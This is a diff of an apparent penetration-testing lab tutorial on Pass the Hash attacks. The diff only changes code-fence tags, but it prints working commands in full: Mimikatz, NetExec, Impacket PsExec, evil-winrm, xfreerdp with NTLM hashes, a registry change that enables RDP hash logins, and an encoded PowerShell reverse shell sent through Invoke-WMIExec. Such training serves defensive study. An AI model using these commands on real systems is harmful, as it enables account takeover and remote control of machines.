@@ -31,8 +31,7 @@ The first tool we will use to perform a Pass the Hash attack is [Mimikatz](https
 
 #### Pass the Hash from Windows Using Mimikatz
 
-```
-        cmd
+```bat
 c:\tools> mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
 
 user    : julio
@@ -96,8 +95,7 @@ To get a reverse shell, we need to start our listener using Netcat on our Window
 
 #### Netcat listener
 
-```
-        powershell
+```powershell
 PS C:\tools> .\nc.exe -lvnp 8001
 
 listening on [any] 8001 ...
@@ -111,8 +109,7 @@ Now we can execute `Invoke-TheHash` to execute our PowerShell reverse shell scri
 
 #### Invoke-TheHash with WMI
 
-```
-        powershell
+```powershell
 PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
 PS c:\tools\Invoke-TheHash> Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMwAzACIALAA4ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
 
@@ -129,8 +126,7 @@ The result is a reverse shell connection from the DC01 host (172.16.1.10).
 
 #### Pass the Hash with Impacket PsExec
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
 
 Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
@@ -160,8 +156,7 @@ There are several other tools in the Impacket toolkit we can use for command exe
 
 #### Pass the Hash with NetExec
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]# netexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
 
 SMB         172.16.1.10   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:.) (signing:True) (SMBv1:False)
@@ -174,8 +169,7 @@ If we want to perform the same actions but attempt to authenticate to each host 
 
 #### NetExec - Command Execution
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]# netexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami
 
 SMB         10.129.201.126  445    MS01            [*] Windows 10 Enterprise 10240 x64 (name:MS01) (domain:.) (signing:False) (SMBv1:True)
@@ -192,8 +186,7 @@ Review the [NetExec documentation Wiki](https://www.netexec.wiki/) to learn more
 
 #### Pass the Hash with evil-winrm
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
 
 Evil-WinRM shell v3.3
@@ -219,8 +212,7 @@ This can be enabled by adding a new registry key `DisableRestrictedAdmin` (REG\_
 
 #### Enable Restricted Admin Mode to allow PtH
 
-```
-        cmd
+```bat
 c:\tools> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
 ```
 
@@ -230,8 +222,7 @@ Once the registry key is added, we can use `xfreerdp` with the option `/pth` to 
 
 #### Pass the Hash using RDP
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
 
 [15:38:26:999] [94965:94966] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
